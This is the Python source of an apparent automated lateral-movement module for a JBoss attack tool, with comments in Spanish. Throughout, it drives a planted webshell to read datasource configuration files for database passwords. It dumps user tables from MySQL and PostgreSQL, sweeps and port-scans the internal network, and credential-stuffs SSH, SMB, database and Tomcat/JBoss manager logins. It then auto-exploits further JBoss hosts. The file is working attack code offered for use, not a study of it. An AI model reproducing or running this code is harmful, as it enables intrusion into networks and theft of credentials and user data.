# -*- coding: utf-8 -*-
"""
PANTER JBOSS - Cadena de Compromiso Automatico
Analyst : Apo1o13
Build   : 2026-04-30 - Custom Edition

Motor de movimiento lateral automatizado:
JBoss comprometido → extrae credenciales de BD → credential stuffing →
compromete otros servicios/JBoss → repite el ciclo.
"""

import re
import sys
import datetime
from time import sleep

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

RED    = '\x1b[91m'
BLUE   = '\033[94m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
WHITE  = '\033[97m'
MAGENTA= '\033[95m'
NORMAL = '\033[0m'


def _p(msg):
    print(msg)
    sys.stdout.flush()


# ══════════════════════════════════════════════════════
#  ARBOL DE INFRAESTRUCTURA COMPROMETIDA
# ══════════════════════════════════════════════════════

class NodoCompromiso:
    def __init__(self, host, metodo, usuario="", password="", detalle=""):
        self.host      = host
        self.metodo    = metodo
        self.usuario   = usuario
        self.password  = password
        self.detalle   = detalle
        self.hijos     = []
        self.creds     = []   # (usuario, password, fuente)
        self.timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    def agregar_hijo(self, nodo):
        self.hijos.append(nodo)
        return nodo

    def agregar_cred(self, usuario, password, fuente):
        self.creds.append((usuario, password, fuente))


def _imprimir_arbol(nodo, prefijo="", es_ultimo=True):
    """Imprime el nodo y sus hijos recursivamente con formato de arbol."""
    conector = "└─ " if es_ultimo else "├─ "
    estado   = RED + BOLD + "[PWNED]" + ENDC if nodo.metodo else YELLOW + "[INFO]" + ENDC

    linea = prefijo + (conector if prefijo else "") + estado + " "
    linea += CYAN + BOLD + nodo.host + ENDC
    if nodo.metodo:
        linea += WHITE + " via " + nodo.metodo + ENDC
    if nodo.usuario:
        linea += GREEN + "  (%s:%s)" % (nodo.usuario, nodo.password) + ENDC
    if nodo.detalle:
        linea += YELLOW + "  [%s]" % nodo.detalle + ENDC
    _p(linea)

    # Credenciales encontradas en este nodo
    extension = "    " if es_ultimo else "│   "
    for i, (u, pw, src) in enumerate(nodo.creds):
        es_ult_cred = (i == len(nodo.creds) - 1) and not nodo.hijos
        con_c = "  └── " if es_ult_cred else "  ├── "
        _p(prefijo + extension + MAGENTA + con_c +
           "cred: " + YELLOW + u + ":" + pw + ENDC +
           MAGENTA + " [%s]" % src + ENDC)

    # Hijos recursivos
    for i, hijo in enumerate(nodo.hijos):
        _imprimir_arbol(hijo, prefijo + extension, i == len(nodo.hijos) - 1)


def mostrar_mapa(raiz):
    """Muestra el mapa completo de infraestructura comprometida."""
    total = _contar_nodos(raiz) - 1   # sin contar raiz

    _p(RED + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║        MAPA DE INFRAESTRUCTURA COMPROMETIDA              ║\n"
       "  ║  Hosts adicionales comprometidos: %-24s║\n" % (str(total) + " ") +
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    _imprimir_arbol(raiz)
    _p("")


def _contar_nodos(nodo):
    return 1 + sum(_contar_nodos(h) for h in nodo.hijos)


# ══════════════════════════════════════════════════════
#  EJECUCION DE COMANDOS VIA WEBSHELL
# ══════════════════════════════════════════════════════

def _exec(http_pool, url, path, headers, cmd, timeout=15):
    try:
        encoded = urlencode({"ppp": cmd})
        r = http_pool.request('GET', url + path + encoded,
                              redirect=False, headers=headers)
        if r.status == 404:
            return ""
        resp = r.data.decode('utf-8', errors='ignore')
        try:
            out = resp.split("pre>")[1]
            out = re.sub(r'</?\w+[^>]*>', '', out)
            return out.replace('\\n', '\n').replace('\\t', '\t').strip()
        except:
            return ""
    except:
        return ""


# ══════════════════════════════════════════════════════
#  PASO 1: EXTRAER CREDENCIALES DE DATASOURCES
# ══════════════════════════════════════════════════════

def extraer_datasources(http_pool, url, path, headers):
    """
    Busca archivos *-ds.xml y standalone.xml en el servidor
    y extrae cadenas de conexion, usuarios y passwords de BD.
    Retorna lista de dicts con keys: db_type, host, port, user, password, db_name
    """
    _p(CYAN + "\n  [CADENA] Paso 1/4 — Extrayendo credenciales de datasources..." + ENDC)

    resultados = []

    # Buscar archivos de datasource
    find_cmd = ("find / \\( -name '*-ds.xml' -o -name 'standalone.xml' "
                "-o -name 'login-config.xml' \\) 2>/dev/null | head -15")
    archivos_raw = _exec(http_pool, url, path, headers, find_cmd)
    archivos = [l.strip() for l in archivos_raw.split('\n') if l.strip()]

    if not archivos:
        _p(YELLOW + "  [!] No se encontraron archivos de datasource." + ENDC)
        return resultados

    _p(GREEN + "  [+] Archivos encontrados: %d" % len(archivos) + ENDC)

    # Patrones de extraccion
    url_re  = re.compile(
        r'connection-url[>\s]*[^<]*jdbc:(\w+)://([^:/]+):?(\d*)/(\w*)', re.IGNORECASE)
    user_re = re.compile(
        r'<user-name>\s*([^<]+)\s*</user-name>', re.IGNORECASE)
    pass_re = re.compile(
        r'<password>\s*([^<]+)\s*</password>', re.IGNORECASE)

    for archivo in archivos:
        contenido = _exec(http_pool, url, path, headers, "cat '%s' 2>/dev/null" % archivo)
        if not contenido:
            continue

        urls_ds  = url_re.findall(contenido)
        users_ds = user_re.findall(contenido)
        passs_ds = pass_re.findall(contenido)

        for i, (db_type, db_host, db_port, db_name) in enumerate(urls_ds):
            db_user = users_ds[i] if i < len(users_ds) else ""
            db_pass = passs_ds[i] if i < len(passs_ds) else ""
            db_port = db_port if db_port else _puerto_defecto(db_type)

            entrada = {
                'db_type': db_type.lower(),
                'host':    db_host.strip(),
                'port':    db_port or _puerto_defecto(db_type),
                'user':    db_user.strip(),
                'password':db_pass.strip(),
                'db_name': db_name.strip(),
                'fuente':  archivo,
            }
            resultados.append(entrada)
            _p(GREEN + "  [+] BD encontrada: %s://%s:%s@%s:%s/%s" % (
                db_type, db_user, db_pass, db_host, db_port, db_name) + ENDC)

    return resultados


def _puerto_defecto(db_type):
    puertos = {'mysql': '3306', 'postgresql': '5432', 'postgres': '5432',
               'oracle': '1521', 'sqlserver': '1433', 'mssql': '1433',
               'mongodb': '27017', 'redis': '6379'}
    return puertos.get(db_type.lower(), '3306')


# ══════════════════════════════════════════════════════
#  PASO 2: VOLCAR USUARIOS DE LA BASE DE DATOS
# ══════════════════════════════════════════════════════

def volcar_base_datos(http_pool, url, path, headers, ds, nodo_padre, add_cred_fn):
    """
    Conecta a la BD via comandos en la webshell y extrae usuarios/passwords.
    Retorna lista de (usuario, password).
    """
    _p(CYAN + "\n  [CADENA] Paso 2/4 — Volcando BD %s://%s..." % (
        ds['db_type'], ds['host']) + ENDC)

    creds_bd = []
    db_type  = ds['db_type']
    host     = ds['host']
    port     = ds['port']
    user     = ds['user']
    pwd      = ds['password']
    db_name  = ds['db_name']

    nodo_bd = NodoCompromiso(
        host  = "%s:%s" % (host, port),
        metodo= "Credencial datasource",
        usuario=user, password=pwd,
        detalle="BD %s" % db_type.upper()
    )

    tablas_usuario = ['users', 'user', 'accounts', 'account', 'members',
                      'member', 'clientes', 'admin', 'admins', 'login',
                      'credentials', 'customer', 'customers']

    if db_type in ('mysql',):
        for tabla in tablas_usuario:
            cmd = ("mysql -h %s -P %s -u %s -p'%s' %s "
                   "-e \"SELECT * FROM %s LIMIT 30;\" 2>/dev/null" %
                   (host, port, user, pwd, db_name, tabla))
            out = _exec(http_pool, url, path, headers, cmd, timeout=10)
            if out and len(out) > 5 and "ERROR" not in out:
                pares = _parsear_tabla_bd(out)
                for u, p in pares:
                    creds_bd.append((u, p))
                    nodo_bd.agregar_cred(u, p, "MySQL:%s.%s" % (db_name, tabla))
                    add_cred_fn("%s:%s" % (host, port), u, p,
                                "MySQL dump (%s.%s)" % (db_name, tabla))
                if pares:
                    _p(GREEN + "  [+] %d credenciales extraidas de %s.%s" % (
                        len(pares), db_name, tabla) + ENDC)
                break

    elif db_type in ('postgresql', 'postgres'):
        for tabla in tablas_usuario:
            cmd = ("PGPASSWORD='%s' psql -h %s -p %s -U %s -d %s "
                   "-c \"SELECT * FROM %s LIMIT 30;\" 2>/dev/null" %
                   (pwd, host, port, user, db_name, tabla))
            out = _exec(http_pool, url, path, headers, cmd, timeout=10)
            if out and len(out) > 5 and "ERROR" not in out:
                pares = _parsear_tabla_bd(out)
                for u, p in pares:
                    creds_bd.append((u, p))
                    nodo_bd.agregar_cred(u, p, "PgSQL:%s.%s" % (db_name, tabla))
                    add_cred_fn("%s:%s" % (host, port), u, p,
                                "PostgreSQL dump (%s.%s)" % (db_name, tabla))
                if pares:
                    _p(GREEN + "  [+] %d credenciales extraidas de %s.%s" % (
                        len(pares), db_name, tabla) + ENDC)
                break

    nodo_padre.agregar_hijo(nodo_bd)
    return creds_bd, nodo_bd


def _parsear_tabla_bd(texto):
    """
    Extrae pares (usuario, password) de la salida tabular de mysql/psql.
    Busca columnas que parezcan username y password.
    """
    pares = []
    user_cols = ['user', 'username', 'login', 'email', 'nombre', 'name',
                 'usuario', 'account', 'correo']
    pass_cols = ['pass', 'password', 'passwd', 'pwd', 'hash', 'secret',
                 'clave', 'contrasena']

    lines = [l.strip() for l in texto.split('\n') if l.strip() and not l.startswith('+')]
    if len(lines) < 2:
        return pares

    # Detectar header
    header = lines[0].lower()
    cols   = [c.strip() for c in re.split(r'\s*\|\s*', header) if c.strip()]

    u_idx = next((i for i, c in enumerate(cols) if any(k in c for k in user_cols)), None)
    p_idx = next((i for i, c in enumerate(cols) if any(k in c for k in pass_cols)), None)

    if u_idx is None or p_idx is None:
        return pares

    for line in lines[1:]:
        cells = [c.strip() for c in re.split(r'\s*\|\s*', line) if c.strip()]
        try:
            u = cells[u_idx]
            p = cells[p_idx]
            if u and p and u != 'NULL' and p != 'NULL':
                pares.append((u, p))
        except:
            continue

    return pares


# ══════════════════════════════════════════════════════
#  PASO 3: CREDENTIAL STUFFING CONTRA OTROS SERVICIOS
# ══════════════════════════════════════════════════════

def escanear_servicios_internos(http_pool, url, path, headers):
    """Detecta IPs y puertos clave en la red interna via webshell."""
    _p(CYAN + "\n  [CADENA] Paso 3/4 — Escaneando red interna..." + ENDC)

    servicios = []

    # Obtener red local — intentar varios metodos
    ifaces = _exec(http_pool, url, path, headers,
                   "ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1'")
    if not ifaces:
        ifaces = _exec(http_pool, url, path, headers,
                       "ifconfig 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1'")

    ip_re  = re.compile(r'inet\s+(\d+\.\d+\.\d+)\.(\d+)')
    redes  = list(set(ip_re.findall(ifaces or "")))

    # Fallback: hostname -I cuando ip/ifconfig no estan disponibles
    if not redes:
        hostname_out = _exec(http_pool, url, path, headers, "hostname -I 2>/dev/null")
        if hostname_out:
            ip_simple = re.compile(r'(\d+\.\d+\.\d+)\.(\d+)')
            for m in ip_simple.finditer(hostname_out):
                if not m.group(0).startswith('127.'):
                    redes.append((m.group(1), m.group(2)))
            redes = list(set(redes))

    if not redes:
        _p(YELLOW + "  [!] No se pudo detectar red interna." + ENDC)
        return servicios

    # Puertos prioritarios: JBoss/web primero, luego DB y servicios
    # Separados en dos niveles: criticos (siempre) y secundarios (si hay tiempo)
    puertos_criticos = {
        8080: 'jboss/tomcat',
        8443: 'jboss/tomcat-ssl',
        22:   'ssh',
        80:   'http',
        443:  'https',
        3306: 'mysql',
        5432: 'postgresql',
        1433: 'mssql',
        445:  'smb',
    }
    puertos_secundarios = {
        21:    'ftp',
        139:   'smb-netbios',
        1521:  'oracle',
        27017: 'mongodb',
        6379:  'redis',
        50000: 'db2',
    }

    for red, _ in redes[:2]:
        _p(GREEN + "  [*] Escaneando %s.0/24..." % red + ENDC)

        # Ping sweep paralelo (todos en background, wait al final)
        ping = ("for i in $(seq 1 254); do "
                "(ping -c1 -W1 %s.$i &>/dev/null && echo %s.$i) & "
                "done; wait 2>/dev/null") % (red, red)
        vivos_raw = _exec(http_pool, url, path, headers, ping) or ""
        vivos = [ip.strip() for ip in vivos_raw.split('\n')
                 if re.match(r'\d+\.\d+\.\d+\.\d+', ip.strip())]

        _p(GREEN + "  [+] Hosts activos: %d" % len(vivos) + ENDC)

        # Limitar a 40 hosts para no tardar demasiado
        for ip in vivos[:40]:
            # Scan puertos criticos con un solo comando bash (mas rapido)
            ports_str = " ".join(str(p) for p in puertos_criticos.keys())
            batch_cmd = (
                "for p in %s; do "
                "(echo >/dev/tcp/%s/$p) 2>/dev/null && echo \"OPEN:$p\"; "
                "done" % (ports_str, ip)
            )
            batch_out = _exec(http_pool, url, path, headers, batch_cmd) or ""
            for linea in batch_out.split('\n'):
                if 'OPEN:' in linea:
                    try:
                        puerto = int(linea.split('OPEN:')[1].strip())
                        servicio = puertos_criticos.get(puerto, 'unknown')
                        _p(GREEN + "  [+] %s:%d (%s)" % (ip, puerto, servicio) + ENDC)
                        servicios.append({'ip': ip, 'port': puerto, 'service': servicio})
                    except:
                        pass

            # Solo escanear puertos secundarios si el host tiene algo interesante
            if any(s['ip'] == ip for s in servicios):
                ports_str2 = " ".join(str(p) for p in puertos_secundarios.keys())
                batch2 = (
                    "for p in %s; do "
                    "(echo >/dev/tcp/%s/$p) 2>/dev/null && echo \"OPEN:$p\"; "
                    "done" % (ports_str2, ip)
                )
                batch2_out = _exec(http_pool, url, path, headers, batch2) or ""
                for linea in batch2_out.split('\n'):
                    if 'OPEN:' in linea:
                        try:
                            puerto = int(linea.split('OPEN:')[1].strip())
                            servicio = puertos_secundarios.get(puerto, 'unknown')
                            _p(GREEN + "  [+] %s:%d (%s)" % (ip, puerto, servicio) + ENDC)
                            servicios.append({'ip': ip, 'port': puerto, 'service': servicio})
                        except:
                            pass

    return servicios


def credential_stuffing(http_pool, url, path, headers,
                        servicios, todas_creds, nodo_padre, add_cred_fn):
    """
    Prueba todas las credenciales encontradas contra todos los servicios detectados.
    """
    _p(CYAN + "\n  [CADENA] Paso 4/4 — Credential stuffing (%d creds x %d servicios)..." % (
        len(todas_creds), len(servicios)) + ENDC)

    comprometidos = []

    for svc in servicios:
        ip      = svc['ip']
        puerto  = svc['port']
        servicio= svc['service']

        for usuario, password in todas_creds:
            if not usuario or not password:
                continue

            exito = False

            # SSH
            if puerto == 22:
                cmd = ("sshpass -p '%s' ssh -o StrictHostKeyChecking=no "
                       "-o ConnectTimeout=3 -o BatchMode=no "
                       "%s@%s 'id' 2>/dev/null" % (password, usuario, ip))
                out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                if out and ("uid=" in out or "root" in out):
                    exito = True
                    detalle = out.split('\n')[0][:50]

            # MySQL
            elif puerto == 3306:
                cmd = ("mysql -h %s -P %d -u %s -p'%s' "
                       "-e 'select 1;' 2>/dev/null" % (ip, puerto, usuario, password))
                out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                if out and "1" in out and "ERROR" not in out:
                    exito = True
                    detalle = "MySQL login exitoso"

            # PostgreSQL
            elif puerto == 5432:
                cmd = ("PGPASSWORD='%s' psql -h %s -p %d -U %s "
                       "-c 'select 1;' 2>/dev/null" % (password, ip, puerto, usuario))
                out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                if out and "1" in out and "ERROR" not in out:
                    exito = True
                    detalle = "PostgreSQL login exitoso"

            # FTP
            elif puerto == 21:
                cmd = ("curl -s --connect-timeout 3 "
                       "ftp://%s:%s@%s/ 2>/dev/null | head -3" % (usuario, password, ip))
                out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                if out and "ERROR" not in out and len(out) > 2:
                    exito = True
                    detalle = "FTP login exitoso"

            # Oracle
            elif puerto == 1521:
                # sqlplus usuario/password@//ip:1521/XE
                cmd = ("sqlplus -S %s/%s@//%s:1521/XE <<'EOF'\nSELECT 1 FROM DUAL;\nEXIT;\nEOF\n"
                       "2>/dev/null | grep -c '1'" % (usuario, password, ip))
                out = _exec(http_pool, url, path, headers, cmd, timeout=12)
                if out and out.strip() == '1':
                    exito = True
                    detalle = "Oracle login exitoso"
                else:
                    # Intentar con SID ORCL si XE falla
                    cmd2 = ("sqlplus -S %s/%s@//%s:1521/ORCL <<'EOF'\nSELECT 1 FROM DUAL;\nEXIT;\nEOF\n"
                            "2>/dev/null | grep -c '1'" % (usuario, password, ip))
                    out2 = _exec(http_pool, url, path, headers, cmd2, timeout=12)
                    if out2 and out2.strip() == '1':
                        exito = True
                        detalle = "Oracle login exitoso (SID ORCL)"

            # MSSQL
            elif puerto == 1433:
                # sqlcmd disponible en algunas distros, o pymssql
                cmd = ("sqlcmd -S %s,%d -U %s -P '%s' -Q 'SELECT 1' 2>/dev/null | grep -c '1'"
                       % (ip, puerto, usuario, password))
                out = _exec(http_pool, url, path, headers, cmd, timeout=10)
                if out and '1' in out:
                    exito = True
                    detalle = "MSSQL login exitoso"
                else:
                    # Fallback: python + pymssql
                    cmd2 = ("python3 -c \""
                            "import pymssql; c=pymssql.connect('%s',%d,'%s','%s',database='master'); "
                            "c.cursor().execute('SELECT 1'); print('OK')"
                            "\" 2>/dev/null" % (ip, puerto, usuario, password))
                    out2 = _exec(http_pool, url, path, headers, cmd2, timeout=10)
                    if out2 and 'OK' in out2:
                        exito = True
                        detalle = "MSSQL login exitoso (pymssql)"

            # Redis (generalmente sin usuario, intentar AUTH con password)
            elif puerto == 6379:
                cmd = ("redis-cli -h %s -p %d -a '%s' PING 2>/dev/null" % (ip, puerto, password))
                out = _exec(http_pool, url, path, headers, cmd, timeout=6)
                if out and 'PONG' in out:
                    exito = True
                    detalle = "Redis AUTH exitoso"
                else:
                    # Intentar sin auth (Redis expuesto sin password)
                    cmd_noauth = "redis-cli -h %s -p %d PING 2>/dev/null" % (ip, puerto)
                    out_noauth = _exec(http_pool, url, path, headers, cmd_noauth, timeout=6)
                    if out_noauth and 'PONG' in out_noauth:
                        exito = True
                        detalle = "Redis SIN autenticacion (acceso directo)"

            # MongoDB
            elif puerto == 27017:
                cmd = ("mongosh --host %s --port %d -u '%s' -p '%s' "
                       "--eval 'db.runCommand({ping:1})' 2>/dev/null | grep -c 'ok'" % (
                           ip, puerto, usuario, password))
                out = _exec(http_pool, url, path, headers, cmd, timeout=10)
                if out and '1' in out:
                    exito = True
                    detalle = "MongoDB login exitoso"
                else:
                    # Sin auth
                    cmd_noauth = ("mongosh --host %s --port %d "
                                  "--eval 'db.runCommand({ping:1})' 2>/dev/null | grep -c 'ok'" % (ip, puerto))
                    out2 = _exec(http_pool, url, path, headers, cmd_noauth, timeout=8)
                    if out2 and '1' in out2:
                        exito = True
                        detalle = "MongoDB SIN autenticacion"

            # SMB / Samba (puerto 445 o 139)
            elif puerto in (445, 139):
                cmd = ("smbclient -L //%s -U '%s%%%s' --no-pass 2>/dev/null | grep 'Sharename'"
                       % (ip, usuario, password))
                out = _exec(http_pool, url, path, headers, cmd, timeout=10)
                if out and 'Sharename' in out:
                    exito = True
                    detalle = "SMB login exitoso — shares: %s" % out.split('\n')[0][:40]
                else:
                    # Intentar IPC$ especificamente
                    cmd2 = ("smbclient //%s/IPC$ -U '%s%%%s' -c 'ls' 2>/dev/null | head -2"
                            % (ip, usuario, password))
                    out2 = _exec(http_pool, url, path, headers, cmd2, timeout=10)
                    if out2 and 'NT_STATUS' not in out2 and len(out2) > 3:
                        exito = True
                        detalle = "SMB IPC$ accesible"

            # Tomcat Manager (HTTP Basic Auth en /manager/html)
            elif puerto in (8080, 8443, 80, 443):
                import base64
                cred_b64 = base64.b64encode(("%s:%s" % (usuario, password)).encode()).decode()
                proto = "https" if puerto in (443, 8443) else "http"
                for mgr_path in ["/manager/html", "/manager/text", "/host-manager/html"]:
                    cmd = ("curl -sk --connect-timeout 4 -o /dev/null -w '%%{http_code}' "
                           "-H 'Authorization: Basic %s' "
                           "'%s://%s:%d%s'" % (cred_b64, proto, ip, puerto, mgr_path))
                    out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                    if out and out.strip() == '200':
                        exito = True
                        detalle = "Tomcat Manager login exitoso en %s" % mgr_path
                        break
                # JBoss Admin Console
                if not exito:
                    for admin_path in ["/admin-console/", "/jmx-console/", "/web-console/"]:
                        cmd = ("curl -sk --connect-timeout 4 -o /dev/null -w '%%{http_code}' "
                               "-H 'Authorization: Basic %s' "
                               "'%s://%s:%d%s'" % (cred_b64, proto, ip, puerto, admin_path))
                        out = _exec(http_pool, url, path, headers, cmd, timeout=8)
                        if out and out.strip() in ('200', '500'):
                            exito = True
                            detalle = "JBoss Admin accesible en %s" % admin_path
                            break

            if exito:
                _p(RED + BOLD + "  [!!!] ACCESO OBTENIDO: %s@%s:%d (%s)" % (
                    usuario, ip, puerto, servicio) + ENDC)
                add_cred_fn("%s:%d" % (ip, puerto), usuario, password,
                            "Credential stuffing (%s)" % servicio)
                nodo = NodoCompromiso(
                    host    = "%s:%d" % (ip, puerto),
                    metodo  = "Credential stuffing → %s" % servicio,
                    usuario = usuario,
                    password= password,
                    detalle = detalle if exito else ""
                )
                nodo_padre.agregar_hijo(nodo)
                comprometidos.append({'nodo': nodo, 'ip': ip, 'port': puerto,
                                      'service': servicio, 'user': usuario, 'pass': password})
                break   # con un acceso exitoso en este servicio, pasar al siguiente

    return comprometidos


# ══════════════════════════════════════════════════════
#  INTENTAR EXPLOTAR OTROS JBOSS DESDE KALI
# ══════════════════════════════════════════════════════

def intentar_explotar_jboss(servicios, nodo_padre, add_cred_fn, check_vul_fn, auto_exploit_fn, gl_args):
    """
    Para cada JBoss/Tomcat detectado en la red interna,
    verifica vulnerabilidad y si esta vulnerable lo explota con auto_exploit_fn.
    """
    jboss_svcs = [s for s in servicios if 'jboss' in s['service'] or 'tomcat' in s['service']]

    if not jboss_svcs:
        return

    _p(CYAN + BOLD +
       "\n  [CADENA] Intentando explotar %d JBoss/Tomcat internos detectados..." % len(jboss_svcs) + ENDC)

    for svc in jboss_svcs:
        target_url = "http://%s:%d" % (svc['ip'], svc['port'])
        _p(GREEN + "\n  [*] Objetivo JBoss lateral: %s" % target_url + ENDC)

        # Verificar vulnerabilidad
        vectores_vulnerables = []
        if check_vul_fn:
            try:
                resultados = check_vul_fn(target_url)
                for vector, estado in resultados.items():
                    if estado in (200, 500):
                        vectores_vulnerables.append(vector)
                        _p(RED + BOLD + "  [!!!] VULNERABLE: %s → %s (HTTP %d)" % (
                            target_url, vector, estado) + ENDC)
            except Exception as e:
                _p(YELLOW + "  [!] Error chequeando %s: %s" % (target_url, str(e)) + ENDC)

        if not vectores_vulnerables:
            _p(YELLOW + "  [-] %s: no parece vulnerable o no responde." % target_url + ENDC)
            continue

        # Intentar explotacion real
        if auto_exploit_fn:
            _p(RED + BOLD + "  [*] Explotando %s via %s..." % (
                target_url, vectores_vulnerables[0]) + ENDC)
            try:
                exito = auto_exploit_fn(target_url, gl_args)
                if exito:
                    _p(RED + BOLD + "  [!!!] COMPROMETIDO: %s" % target_url + ENDC)
                    add_cred_fn(target_url, "shell", "via-jboss",
                                "JBoss lateral comprometido via %s" % vectores_vulnerables[0])
                    nodo = NodoCompromiso(
                        host    = target_url,
                        metodo  = "JBoss lateral → " + vectores_vulnerables[0],
                        detalle = "Comprometido automaticamente"
                    )
                    nodo_padre.agregar_hijo(nodo)
                else:
                    _p(YELLOW + "  [!] Exploit lanzo pero no confirmo shell en %s." % target_url + ENDC)
                    nodo = NodoCompromiso(
                        host    = target_url,
                        metodo  = "JBoss vulnerable (sin shell)",
                        detalle = " | ".join(vectores_vulnerables)
                    )
                    nodo_padre.agregar_hijo(nodo)
            except Exception as e:
                _p(YELLOW + "  [!] Error explotando %s: %s" % (target_url, str(e)) + ENDC)
        else:
            # Sin funcion de exploit, registrar como vulnerable
            add_cred_fn(target_url, "N/A", "N/A",
                        "JBoss vulnerable via %s (sin auto-exploit)" % vectores_vulnerables[0])
            nodo = NodoCompromiso(
                host    = target_url,
                metodo  = "Vulnerable: " + " | ".join(vectores_vulnerables),
                detalle = "Exploit manual requerido"
            )
            nodo_padre.agregar_hijo(nodo)
            _p(YELLOW + "  [!] Use panterjboss.py -u %s para explotar manualmente." % target_url + ENDC)


# ══════════════════════════════════════════════════════
#  ORQUESTADOR PRINCIPAL
# ══════════════════════════════════════════════════════

def ejecutar_cadena(http_pool, url, path, headers, add_cred_fn,
                    check_vul_fn=None, auto_exploit_fn=None, gl_args=None):
    """
    Punto de entrada principal de la Cadena de Compromiso.
    Orquesta todos los pasos y muestra el mapa final.
    """
    _p(RED + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║       INICIANDO CADENA DE COMPROMISO AUTOMATICO          ║\n"
       "  ║  " + url.ljust(54) + "║\n"
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    raiz = NodoCompromiso(host=url, metodo="JBoss exploit (vector inicial)")

    # Acumular TODAS las credenciales encontradas
    todas_creds = []

    # ── Paso 1: Datasources ──────────────────────────────
    datasources = extraer_datasources(http_pool, url, path, headers)

    # ── Paso 1b: Si hay DB2, ataque especializado automatico ──
    ds_db2 = [d for d in datasources if 'db2' in d.get('db_type', '').lower()]
    ds_otros = [d for d in datasources if 'db2' not in d.get('db_type', '').lower()]

    if ds_db2:
        _p(RED + BOLD +
           "\n  [AUTO-DB2] Detectadas %d bases de datos DB2 — iniciando ataque especializado...\n" % len(ds_db2)
           + ENDC)
        try:
            import _db2support
            evidencias_auto = []
            creds_db2 = _db2support.ejecutar_ataque_db2(
                http_pool   = http_pool,
                url         = url,
                path        = path,
                headers     = headers,
                add_cred_fn = add_cred_fn,
                evidencias  = evidencias_auto,
            )
            todas_creds.extend(creds_db2)
            # Agregar nodos DB2 al arbol
            for ds in ds_db2:
                nodo_db2 = NodoCompromiso(
                    host    = "%s:%s/%s" % (ds['host'], ds['port'], ds['db_name']),
                    metodo  = "DB2 especializado",
                    usuario = ds.get('user', ''),
                    password= ds.get('password', ''),
                    detalle = "DB2 Auto-Attack"
                )
                for u, p in creds_db2:
                    nodo_db2.agregar_cred(u, p, "DB2 dump")
                raiz.agregar_hijo(nodo_db2)
        except Exception as e:
            _p(YELLOW + "  [!] Error en ataque DB2 automatico: %s" % str(e) + ENDC)

    # ── Paso 2: Volcar otras BDs (MySQL, PostgreSQL) ──
    for ds in ds_otros:
        creds_bd, nodo_bd = volcar_base_datos(
            http_pool, url, path, headers, ds, raiz, add_cred_fn)
        todas_creds.extend(creds_bd)

    # Agregar tambien credenciales de shadow si ya fueron obtenidas
    # (se pasan via add_cred_fn que las registra en found_credentials de panterjboss)
    try:
        import panterjboss as jb
        for c in jb.found_credentials:
            if c['password'] not in ('N/A', '') and c['user'] not in ('N/A', ''):
                todas_creds.append((c['user'], c['password']))
    except:
        pass

    # Deduplicar
    todas_creds = list(set(todas_creds))
    _p(GREEN + "\n  [+] Total de credenciales acumuladas para stuffing: %d" % len(todas_creds) + ENDC)

    # ── Paso 3: Escanear red interna ────────────────────
    servicios = escanear_servicios_internos(http_pool, url, path, headers)

    if not servicios:
        _p(YELLOW + "  [!] No se detectaron servicios internos accesibles." + ENDC)
        mostrar_mapa(raiz)
        return raiz

    # ── Paso 4: Credential stuffing ─────────────────────
    if todas_creds:
        _p(CYAN + "\n  [CADENA] Paso 4/4 — Credential stuffing (%d creds × %d servicios)..." % (
            len(todas_creds), len(servicios)) + ENDC)
        comprometidos = credential_stuffing(
            http_pool, url, path, headers,
            servicios, todas_creds, raiz, add_cred_fn)
    else:
        _p(YELLOW + BOLD +
           "\n  [!] Sin credenciales para stuffing.\n"
           "  [!] Sugerencia: seleccione [2] Buscar credenciales y [3] Crackear hashes\n"
           "  [!] o [8] Ataque DB2 para obtener credenciales antes de ejecutar [7].\n"
           + ENDC)

    # ── Extra: Intentar explotar otros JBoss desde Kali ─
    if check_vul_fn:
        intentar_explotar_jboss(servicios, raiz, add_cred_fn,
                                check_vul_fn, auto_exploit_fn, gl_args)

    # ── Mapa final ──────────────────────────────────────
    mostrar_mapa(raiz)

    return raiz
